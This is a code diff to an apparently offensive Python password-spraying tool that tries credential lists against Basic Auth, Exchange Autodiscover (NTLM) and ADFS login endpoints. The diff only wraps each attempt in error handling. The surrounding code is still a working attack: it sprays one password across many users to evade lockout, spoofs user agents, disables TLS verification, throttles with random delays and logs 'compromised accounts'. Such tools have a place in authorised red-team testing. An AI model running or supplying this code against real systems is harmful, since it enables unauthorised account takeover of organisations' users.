@@ -143,26 +143,30 @@ def basicauth_attempts(users, passes, targets, output_file_name, sleep_time, ran
         for target in targets:  # checking each target separately
             for password in passes:  # trying one password against each user, less likely to lockout users
                 for username in users:
-                    session = requests.Session()
-                    session.auth = (username, password)
-                    response = session.get(target)
-                    #  Currently checking only if working or not, need to add more tests in the future
-                    if response.status_code == 200:
-                        status = 'Valid creds'
-                        output(status, username, password, target, output_file_name)
-                        working_creds_counter += 1
-                        LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
-                    else:
-                        status = 'Invalid'
-                        if verbose:
+                    try:
+                        session = requests.Session()
+                        session.auth = (username, password)
+                        response = session.get(target)
+                        #  Currently checking only if working or not, need to add more tests in the future
+                        if response.status_code == 200:
+                            status = 'Valid creds'
                             output(status, username, password, target, output_file_name)
-                        LOGGER.debug("[-]Creds failed for: %s" % username)
-                    if random is True:  # let's wait between attempts
-                        sleep_time = random_time(min_sleep, max_sleep)
-                        time.sleep(float(sleep_time))
-                    else:
-                        time.sleep(float(sleep_time))
-
+                            working_creds_counter += 1
+                            LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
+                        else:
+                            status = 'Invalid'
+                            if verbose:
+                                output(status, username, password, target, output_file_name)
+                            LOGGER.debug("[-]Creds failed for: %s" % username)
+                        if random is True:  # let's wait between attempts
+                            sleep_time = random_time(min_sleep, max_sleep)
+                            time.sleep(float(sleep_time))
+                        else:
+                            time.sleep(float(sleep_time))
+                    except requests.exceptions.ConnectionError as e:
+                        LOGGER.debug("[-] SSL Issue, skipping %s. " % username)
+                        continue
+                        
         LOGGER.info("[*] Overall compromised accounts: %s" % working_creds_counter)
         LOGGER.info("[*] Finished running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
 
@@ -187,26 +191,30 @@ def autodiscover_attempts(users, passes, targets, output_file_name, sleep_time, 
         for target in targets:  # checking each target separately
             for password in passes:  # trying one password against each user, less likely to lockout users
                 for username in users:
-                    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-                    req = requests.get(target, auth=HttpNtlmAuth(username, password),
-                                       headers={'User-Agent': 'Microsoft'}, verify=False)
-                    #  Currently checking only if working or not, need to add more tests in the future
-                    if req.status_code == 200:
-                        status = 'Valid creds'
-                        output(status, username, password, target, output_file_name)
-                        working_creds_counter += 1
-                        LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
-                    else:
-                        status = 'Invalid'
-                        if verbose:
+                    try:
+                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+                        req = requests.get(target, auth=HttpNtlmAuth(username, password),
+                                           headers={'User-Agent': 'Microsoft'}, verify=False)
+                        #  Currently checking only if working or not, need to add more tests in the future
+                        if req.status_code == 200:
+                            status = 'Valid creds'
                             output(status, username, password, target, output_file_name)
-                        LOGGER.debug("[-]Creds failed for: %s" % username)
-                    if random is True:  # let's wait between attempts
-                        sleep_time = random_time(min_sleep, max_sleep)
-                        time.sleep(float(sleep_time))
-                    else:
-                        time.sleep(float(sleep_time))
-
+                            working_creds_counter += 1
+                            LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
+                        else:
+                            status = 'Invalid'
+                            if verbose:
+                                output(status, username, password, target, output_file_name)
+                            LOGGER.debug("[-]Creds failed for: %s" % username)
+                        if random is True:  # let's wait between attempts
+                            sleep_time = random_time(min_sleep, max_sleep)
+                            time.sleep(float(sleep_time))
+                        else:
+                            time.sleep(float(sleep_time))
+                    except requests.exceptions.ConnectionError as e:
+                        LOGGER.debug("[-] SSL Issue, skipping %s. " % username)
+                        continue
+                        
         LOGGER.info("[*] Overall compromised accounts: %s" % working_creds_counter)
         LOGGER.info("[*] Finished running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
 
@@ -232,37 +240,41 @@ def adfs_attempts(users, passes, targets, output_file_name, sleep_time, random, 
         for target in targets:  # checking each target separately
             for password in passes:  # trying one password against each user, less likely to lockout users
                 for username in users:
-                    target_url = "%s/adfs/ls/?client-request-id=&wa=wsignin1.0&wtrealm=urn%%3afederation" \
-                                 "%%3aMicrosoftOnline&wctx=cbcxt=&username=%s&mkt=&lc=" % (target, username)
-                    post_data = urllib.parse.urlencode({'UserName': username, 'Password': password,
-                                                        'AuthMethod': 'FormsAuthentication'}).encode('ascii')
-                    session = requests.Session()
-                    session.auth = (username, password)
-                    response = session.post(target_url, data=post_data, allow_redirects=False,
-                                            headers={'Content-Type': 'application/x-www-form-urlencoded',
-                                                     'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:65.0) '
-                                                                   'Gecko/20100101 Firefox/65.0',
-                                                     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9, '
-                                                               'image/webp,*/*;q=0.8'})
-                    status_code = response.status_code
-                    #  Currently checking only if working or not, need to add more tests in the future
+                    try:
+                        target_url = "%s/adfs/ls/?client-request-id=&wa=wsignin1.0&wtrealm=urn%%3afederation" \
+                                     "%%3aMicrosoftOnline&wctx=cbcxt=&username=%s&mkt=&lc=" % (target, username)
+                        post_data = urllib.parse.urlencode({'UserName': username, 'Password': password,
+                                                            'AuthMethod': 'FormsAuthentication'}).encode('ascii')
+                        session = requests.Session()
+                        session.auth = (username, password)
+                        response = session.post(target_url, data=post_data, allow_redirects=False,
+                                                headers={'Content-Type': 'application/x-www-form-urlencoded',
+                                                         'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:65.0) '
+                                                                       'Gecko/20100101 Firefox/65.0',
+                                                         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9, '
+                                                                   'image/webp,*/*;q=0.8'})
+                        status_code = response.status_code
+                        #  Currently checking only if working or not, need to add more tests in the future
 
-                    if status_code == 302:
-                        status = 'Valid creds'
-                        output(status, username, password, target, output_file_name)
-                        working_creds_counter += 1
-                        LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
-                    else:
-                        status = 'Invalid'
-                        if verbose:
+                        if status_code == 302:
+                            status = 'Valid creds'
                             output(status, username, password, target, output_file_name)
-                        LOGGER.debug("[-]Creds failed for: %s" % username)
-                    if random is True:  # let's wait between attempts
-                        sleep_time = random_time(min_sleep, max_sleep)
-                        time.sleep(float(sleep_time))
-                    else:
-                        time.sleep(float(sleep_time))
-
+                            working_creds_counter += 1
+                            LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
+                        else:
+                            status = 'Invalid'
+                            if verbose:
+                                output(status, username, password, target, output_file_name)
+                            LOGGER.debug("[-]Creds failed for: %s" % username)
+                        if random is True:  # let's wait between attempts
+                            sleep_time = random_time(min_sleep, max_sleep)
+                            time.sleep(float(sleep_time))
+                        else:
+                            time.sleep(float(sleep_time))
+                    except requests.exceptions.ConnectionError as e:
+                        LOGGER.debug("[-] SSL Issue, skipping %s. " % username)
+                        continue
+                        
         LOGGER.info("[*] Overall compromised accounts: %s" % working_creds_counter)
         LOGGER.info("[*] Finished running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
 
